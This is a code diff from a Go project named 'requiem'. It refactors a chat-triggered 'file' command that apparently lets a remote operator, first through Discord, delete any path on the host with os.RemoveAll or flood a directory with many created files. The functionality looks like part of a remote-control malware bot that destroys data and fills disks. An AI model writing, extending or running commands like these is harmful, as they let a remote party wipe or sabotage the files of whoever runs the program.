@@ -7,14 +7,13 @@ import (
 	"strings"
 	"time"
 
+	"requiem/store"
 	"requiem/utils"
-
-	"github.com/bwmarrin/discordgo"
 )
 
-func (*FileCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, args []string) {
+func (*FileCommand) Exec(ctx *store.CommandContext, args []string) {
 	if len(args) < 2 {
-		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 You need to provide a flag and a path.", msg.Reference())
+		ctx.ReplyMsg("🟥 You need to provide a flag and a path.")
 		return
 	}
 
@@ -22,25 +21,25 @@ func (*FileCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, a
 
 	path := utils.UnwrapQuotes(content)
 	if path == "" {
-		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 You need to wrap the path in double quotes.", msg.Reference())
+		ctx.ReplyMsg("🟥 You need to wrap the path in double quotes.")
 		return
 	}
 
 	if utils.HasFlag(content, "delete") {
 		err := os.RemoveAll(path)
 		if err != nil {
-			ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to delete - %s", err), msg.Reference())
+			ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to delete - %s", err))
 			return
 		}
 
-		ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟩 Successfully deleted %q", path), msg.Reference())
+		ctx.ReplyMsg(fmt.Sprintf("🟩 Successfully deleted %q", path))
 		return
 	}
 
 	if utils.HasFlag(content, "flood") {
 		count, found := utils.FindNumber(content)
 		if found == false {
-			ses.ChannelMessageSendReply(msg.ChannelID, "🟥 You need to provide a number.", msg.Reference())
+			ctx.ReplyMsg("🟥 You need to provide a number.")
 			return
 		}
 
@@ -53,11 +52,11 @@ func (*FileCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, a
 			file.Close()
 		}
 
-		ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟩 Successfully flooded %q", path), msg.Reference())
+		ctx.ReplyMsg(fmt.Sprintf("🟩 Successfully flooded %q", path))
 		return
 	}
 
-	ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Invalid flag.", msg.Reference())
+	ctx.ReplyMsg("🟥 Invalid flag.")
 }
 
 func (*FileCommand) Name() string {
